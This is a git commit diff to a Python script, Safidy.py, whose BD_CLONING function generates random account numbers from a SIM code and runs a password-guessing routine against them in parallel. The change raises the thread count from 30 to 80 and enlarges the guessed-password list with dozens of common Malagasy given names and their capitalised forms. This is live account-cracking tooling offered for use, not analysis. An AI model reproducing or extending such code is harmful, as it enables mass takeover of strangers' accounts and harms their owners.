250a4916e422f6022f5f5f767e27d932b79702f7
Adala <167643700+Safidy03@users.noreply.github.com>
2024-05-17 08:12:49 +0300

    Update Safidy.py

--- Safidy.py
+++ Safidy.py
@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=30) as Dipto:
+    with tred(max_workers=80) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'rakoto','Rakoto','miangola','Miangola','fiderana','Fiderana','miangaly','Miangaly','fandresena','Fandresena','valisoa','Valisoa','nirina','Nirina','nomena','Nomena','nilaina','Nilaina','nambinina','Nambinina','faniry','Faniry','fitiavana','Fitiavana','malala','Malala','lahatra','Lahatra','lafatra','Lafatra']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nomena','Nomena','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','fiderana','Fiderana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','avotra','Avotra','domoina','Domoina','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','andriatsitohaina','Andriatsitohaina','sarobidy','Sarobidy','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
